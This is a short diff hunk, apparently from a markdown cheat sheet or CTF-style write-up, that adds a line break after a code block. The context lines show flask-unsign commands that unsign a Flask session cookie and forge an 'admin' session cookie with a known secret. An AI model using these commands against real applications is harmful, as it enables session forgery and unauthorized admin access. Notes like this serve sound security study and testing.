@@ -25,3 +25,5 @@ flask-unsign --unsign --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9
 # Forge flask cookie
 flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret "secret123"
 ```
+
+<br>
